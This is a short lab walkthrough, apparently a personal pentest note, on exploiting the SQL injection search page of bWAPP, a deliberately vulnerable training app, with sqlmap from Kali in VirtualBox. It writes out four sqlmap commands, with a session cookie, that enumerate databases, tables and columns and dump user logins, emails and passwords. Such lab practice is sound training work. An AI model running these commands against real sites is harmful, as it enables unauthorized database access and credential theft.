# exploit bWAPP SQLmap

1\) install Kali and bWAPP vm in virtual box;

![](/pentest/VirtualBox-2-VM.png)

2\) launch bWAP and make sure it is running;

![](/pentest/bWAPP-VM.png)

3\) Launch Kali and make sure you can access the bWAPP from Iceweasel.

![](/pentest/access-bWAPP-from-kali.png)

4\)  Go to SQL Injection \(GET/Search\)

![](/pentest/choose-SQL-GET.png)

5\) key in a search string; copy of the resulted URL;![](/pentest/key-in-search-box.png)

6\) Find out the cookie for the site;

![](/pentest/get-cookie-1.png)

![](/pentest/get-cookie-2.png)

**Now, it is show time; launch SQLmap from terminal;**

**step1 **root@kali:~\# sqlmap -u "[http://192.168.56.101/bWAPP/sqli\_1.php?title=](http://192.168.56.101/bWAPP/sqli_1.php?title=)" --cookie="PHPSESSID=a9bd3686d9c53a3a8c0842c8886b564b;security\_level=0" --dbs

![](/pentest/s1-sql-all-dbs.png)

**step2 **root@kali:~\# sqlmap -u "[http://192.168.56.101/bWAPP/sqli\_1.php?title=](http://192.168.56.101/bWAPP/sqli_1.php?title=)" --cookie="PHPSESSID=a9bd3686d9c53a3a8c0842c8886b564b;security\_level=0" -D _**bWAPP **_--tables

![](/pentest/s2-all-tables.png)

**step3 **root@kali:~\# sqlmap -u "[http://192.168.56.101/bWAPP/sqli\_1.php?title=](http://192.168.56.101/bWAPP/sqli_1.php?title=)" --cookie="PHPSESSID=a9bd3686d9c53a3a8c0842c8886b564b;security\_level=0" -D _**bWAPP **_-T _**users **_--columns

![](/pentest/s3-all-column.png)

**step4 **root@kali:~\# sqlmap -u "[http://192.168.56.101/bWAPP/sqli\_1.php?title=](http://192.168.56.101/bWAPP/sqli_1.php?title=)" --

cookie="PHPSESSID=a9bd3686d9c53a3a8c0842c8886b564b;security\_level=0" -D bWAPP -T users -C** login,email,password** --dump

![](/pentest/s4-all-user-pwd.png)

